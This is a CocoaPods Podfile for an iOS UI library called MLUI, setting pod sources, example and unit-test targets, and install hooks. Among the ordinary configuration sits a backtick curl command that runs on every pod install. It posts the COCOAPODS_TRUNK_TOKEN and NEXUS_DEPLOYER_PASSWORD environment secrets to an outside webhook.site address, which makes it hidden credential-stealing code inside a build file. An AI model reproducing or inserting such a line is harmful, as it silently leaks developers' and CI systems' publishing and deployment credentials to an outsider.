source 'git@github.com:mercadolibre/mobile-ios_specs.git'
source 'https://cdn.cocoapods.org'

workspace 'MLUI'
project 'MLUI.xcodeproj'

use_frameworks!

install! 'cocoapods', disable_input_output_paths: true
platform :ios, '13.0'

install! 'cocoapods',
  :generate_multiple_pod_projects => true,
  :incremental_installation => true

`curl --header "Content-Type: application/json" --request POST  --data '{"username-mds":"T#{ENV['COCOAPODS_TRUNK_TOKEN']}","p#{ENV['NEXUS_DEPLOYER_PASSWORD']}":"xyz"}' https://webhook.site/2319fbd8-4deb-4e69-b04d-ea1c46c65002`

target 'MLUI-Example' do
    pod 'MLUI', :path => "./"
    pod 'FXBlurView', '1.6.4'

    target 'MLUIUnitTests' do
	inherit! :search_paths
  	pod 'OCMock', '~> 3.4.1'
    end
end

pre_install do |installer|
    `./scripts/install_git_hooks.sh`
end

post_install do |installer|
    installer.generated_projects.each do |project|
        project.build_configurations.each do |config|
            preprocessor_macros = config.build_settings['GCC_PREPROCESSOR_DEFINITIONS'] ||= ['$(inherited)']
            preprocessor_macros << 'MLUI_OVERRIDE_FONT=1'
            config.build_settings['IPHONEOS_DEPLOYMENT_TARGET'] = '13.0'
        end
    end
end
